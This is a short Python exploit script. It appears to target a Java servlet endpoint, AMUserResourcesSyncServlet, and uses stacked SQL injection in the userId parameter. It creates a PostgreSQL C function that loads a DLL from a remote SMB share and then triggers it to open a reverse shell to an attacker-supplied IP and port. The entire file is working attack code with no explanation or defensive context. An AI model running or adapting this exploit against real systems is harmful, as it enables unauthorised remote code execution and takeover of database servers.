#!/usr/bin/env python3
import sys
import requests
import urllib3

# suppress only the single InsecureRequestWarning from urllib3 needed
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def log(msg):
    print(msg)

def make_request(url, sql):
    log(f"[*] Executing query: {sql}")
    resp = requests.get(url % sql, verify=False)
    return resp

def create_udf_func(url):
    log("[+] Creating function...")
    sql = (
        "create or replace function rev_shell(text,integer) "
        "returns void as "
        "$$\\\\192.168.45.224\\visualstudio\\REV.dll$$, "
        "$$connect_back$$ language C strict"
    )
    make_request(url, sql)

def trigger_udf(url, ip, port):
    log("[+] Launching reverse shell...")
    sql = f"select rev_shell($${ip}$$, {int(port)})"
    make_request(url, sql)

def main():
    if len(sys.argv) != 4:
        print(f"[-] Usage: {sys.argv[0]} serverIP:port attackerIP port")
        sys.exit(1)

    server, attacker, port = sys.argv[1], sys.argv[2], sys.argv[3]
    sqli_url = (
        f"https://{server}"
        "/servlet/AMUserResourcesSyncServlet?ForMasRange=1&"
        "userId=1;%s;--"
    )

    create_udf_func(sqli_url)
    trigger_udf(sqli_url, attacker, port)

if __name__ == "__main__":
    main()
